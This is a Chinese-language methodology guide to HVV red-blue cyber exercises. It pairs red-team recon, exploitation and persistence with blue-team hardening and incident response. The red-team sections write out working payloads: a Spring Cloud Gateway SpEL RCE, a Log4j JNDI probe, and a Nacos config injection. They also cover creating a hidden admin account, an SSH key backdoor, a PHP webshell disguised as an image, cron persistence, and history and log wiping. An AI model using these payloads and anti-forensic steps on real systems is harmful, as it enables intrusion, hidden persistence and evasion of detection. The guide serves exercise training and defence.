# HVV 红蓝对抗实战方法论

> 从信息收集、漏洞利用到应急响应——HVV 全流程实战

---

## 红队攻击方法论

### 阶段一：信息收集

```bash
# 侦察阶段的三层目标：
# 1. 外部资产发现
# 2. 技术栈指纹识别
# 3. 人员侧信息收集

# 子域名收集
subfinder -d example.com -o sub.txt
amass enum -d example.com -o amass.txt

# 存活主机探测
httpx -l sub.txt -o alive.txt
httpx -l sub.txt -o alive.txt -title -status-code -tech-detect

# 端口扫描
naabu -l alive.txt -top-ports 1000 -o ports.txt

# 技术栈识别
whatweb -i alive.txt --log-verbose=tech.log

# GitHub 信息泄露
gitdorker -tf TOKENSFILE -q "example.com" -d "potential_secrets"

# 员工邮箱收集
theHarvester -d example.com -b linkedin,google,bing

# 近期攻防重点: 公有云暴露面、第三方SaaS、供应链系统
```

### 阶段二：漏洞发现

```bash
# 自动漏洞扫描
nuclei -l alive.txt -t cves/ -t exposures/ -t misconfigurations/ -o nuclei_result.txt

# 敏感路径发现
dirsearch -l alive.txt -e php,asp,jsp -t 50 -o dirs.txt
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# 漏洞专项检测
# Shiro rememberMe 枚举
python3 shiro_enum.py -u https://target.com

# Spring Boot Actuator 检查
curl https://target.com/actuator/health
curl https://target.com/actuator/env
curl https://target.com/actuator/heapdump
```

### 阶段三：漏洞利用

```yaml
历史经典攻击链（2022 HVV 真实案例）:

案例 1: OA → 域控
  泛微 OA 文件上传 RCE
  → 利用 WebLogic 横向移动
  → 抓取域管理员密码
  → 控制整个域环境

案例 2: 钓鱼 → 内网渗透
  钓鱼邮件（带恶意宏的 Excel）
  → 员工打开 → C2 上线
  → 探测内网 445/3389 端口
  → 永恒之蓝横向扩散 → 核心服务器

案例 3: 云 → 容器逃逸
  Nacos 未授权获取配置
  → 发现数据库密码
  → 从数据库到 K8s ServiceAccount
  → 容器逃逸到宿主机 → 控制整个集群
```

```bash
# HVV 2024 高频利用 POC 命令

# 1. Nacos 认证绕过
curl -X POST "http://target:8848/nacos/v1/cs/configs?dataId=test&group=DEFAULT_GROUP&content=payload"

# 2. Spring Cloud Gateway RCE
curl -X POST "http://target/actuator/gateway/routes/hack" \
  -H "Content-Type: application/json" \
  -d '{"predicates":[],"filters":[{"name":"AddResponseHeader","args":{"_genkey_0":"#{T(java.lang.Runtime).getRuntime().exec('id')}"}}],"uri":"http://example.com"}'

# 3. Shiro 反序列化
java -jar ShiroAttack2.jar -u http://target/login.jsp

# 4. Log4j RCE 检测
curl -H "User-Agent: \${jndi:ldap://your-dnslog.cn/a}" http://target

# 5. 通杀型: 所有 HVV 热点漏洞批量检测
nuclei -l targets.txt -t ~/nuclei-templates/ -severity critical,high
```

### 阶段四：权限维持与打扫战场

```bash
# 权限维持
# - 创建隐藏用户（Windows）
net user temp$ P@ssw0rd /add
net localgroup administrators temp$ /add

# - 添加 SSH 后门
echo "ssh-rsa AAAAB3N... kali@kali" >> ~/.ssh/authorized_keys

# - WebShell（避开关键词检测）
echo '<?php @eval($_POST["c"]);?>' > shell.jpg  # 伪装图片

# - 定时任务持久化
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.systemd.sh") | crontab -

# 打扫战场
# - 删除历史记录
history -c && rm -f ~/.bash_history
# - 清除日志
sed -i '/attacker_ip/d' /var/log/auth.log
# - 关闭端口转发
iptables -F
```

---

## 蓝队防守方法论

### 防守框架

```
┌─────────────────────────────────────┐
│           HVV 防守三维体系           │
├────────────────┬────────────────────┤
│   事前防御      │     事中检测        │
├────────────────┼────────────────────┤
│ 资产梳理       │  流量分析           │
│ 漏洞修复       │  WAF/IPS 拦截       │
│ 加固配置       │  EDR 终端响应       │
│ 红蓝预演       │  威胁情报匹配        │
│ 备份恢复       │  异常行为检测        │
├────────────────┼────────────────────┤
│             事后溯源                  │
│ 攻击链还原 → 证据固定 → 报告输出     │
└─────────────────────────────────────┘
```

### 防守命令合集

```bash
# 1. 资产梳理
# 扫描开放端口
masscan 192.168.1.0/24 -p1-65535 --rate=10000

# 检查暴露面
# - 所有公网 IP
# - 云主机、RDS、SLB
# - 办公出口 IP 段

# 2. 漏洞扫描
grype docker:nginx:latest  # 容器镜像漏洞
trivy fs --severity=CRITICAL,HIGH /app
nuclei -l assets.txt -t cves/ -o must_fix.txt

# 3. 安全加固
# Nginx 限制访问
location /actuator {
    deny all;
    return 404;
}

# WAF 规则添加
# - 拦截 /nacos/v1/cs/configs 异常 POST
# - 拦截 /actuator/gateway/routes 创建
# - 拦截 rememberMe Cookie 中的反序列化特征

# 4. 日志监控
# 实时监控登录失败
tail -f /var/log/auth.log | grep "Failed password"

# 监控异常网络连接
ss -tnp | grep -E "192.168|10\.0\.0"

# 5. 应急响应
# 发现被攻破 → 断网隔离
iptables -A INPUT -s attacker_ip -j DROP
# 关停可疑进程
kill -9 $(pgrep -f "nc|ncat|socat")
# 抓取证
tcpdump -i eth0 host attacker_ip -w evidence.pcap
```

### HVV 高价值防守点

```yaml
TOP 防守检查项:

1. 弱口令:
   └── ssh/rdp/mysql/redis/web 管理台
   └── 默认口令: admin/admin, root/root, test/test

2. 未授权访问:
   └── Nacos / Actuator / Kibana / Elasticsearch
   └── Docker API 2375 / K8s API 6443

3. 敏感信息泄露:
   └── GitHub 代码仓库 / 开发文档
   └── 配置文件中的密码/api_key/db连接串

4. 中间件漏洞:
   └── Shiro < 1.2.5 / FastJSON < 1.2.83
   └── ThinkPHP < 5.0.23 / Spring < 5.3.18

5. 容器安全:
   └── Docker daemon 端口暴露
   └── K8s 匿名访问 API
   └── 容器运行在特权模式
```

---

## 常见攻击链可视化

```text
典型 HVV 攻击链（2024 真实案例）:

第一天:
  09:00 红队收到目标列表
  10:00 子域名收集完成，发现 dev.example.com
  14:00 发现 dev 使用 Nacos 2.0，存在认证绕过
  15:00 从 Nacos 获取数据库配置（明文密码）
  16:00 连接 MySQL 拿到 webshell
  17:00 横向到 Jenkins 服务器

第二天:
  09:00 Jenkins 未授权 → 构建任务执行系统命令
  10:00 拿到目标内网核心服务器权限
  14:00 K8s 集群 dashboard 未授权
  15:00 控制全部 Pod → 业务系统停服演示
  16:00 提交白队: 控制核心业务系统

蓝队防守:
  第一天:
    09:00 白队通知被攻击，蓝队启动应急
    10:00 发现 dev 上 Nacos 异常连接
    14:00 关闭 Nacos 公网端口，回滚配置
    15:00 检测到数据库异常查询
    16:00 发现 webshell → 断网隔离
  第二天:
    09:00 发现 Jenkins 异常构建
    10:00 修复 Jenkins 未授权漏洞
    14:00 发现 K8s 异常 → 暂停所有 Pod
    16:00 溯源攻击链 → 提交白队报告
```

---

## 安全工具推荐

```bash
# 自动化检测工具
nuclei        # 模板化漏洞扫描（HVV 必装）
xray          # 被动代理扫描器
goby          # 资产扫描+漏洞利用
vulmap        # 漏洞扫描器

# HVV 专项工具
ShiroAttack2  # Shiro 反序列化利用
SpringExploit # Spring 系列漏洞利用
NacosExp      # Nacos 漏洞利用
Log4jScanner  # Log4j 检测

# 信息收集
fofa          # 网络空间搜索引擎
hunter        # 鹰图资产搜索
quake         # 360 网络空间测绘
```

---

## 延伸阅读

- [什么是 HVV 护网行动](https://www.sohu.com/a/869847910_122090124)
- [2025 年 HVV 全面指南](https://www.sohu.com/a/862871963_122004016)
- [HVV 发展史详解](https://blog.csdn.net/weixin_41287260/article/details/146336710)
- [红蓝对抗实战详解](https://blog.csdn.net/A1_3_9_7/article/details/146165929)
- [Hvv2021-2024 漏洞 POC 合集](https://www.cnblogs.com/chen-w/category/1961203.html)
- [Awesome-POC HVV 目录](https://github.com/Threekiii/Awesome-POC/tree/master/2023-HVV-POC)
- [2022 HVV POC 整理](https://github.com/caine111/2022-HW-POC)

*下一篇：[HVV 红队攻击技术实战](02-attack-techniques.md)*
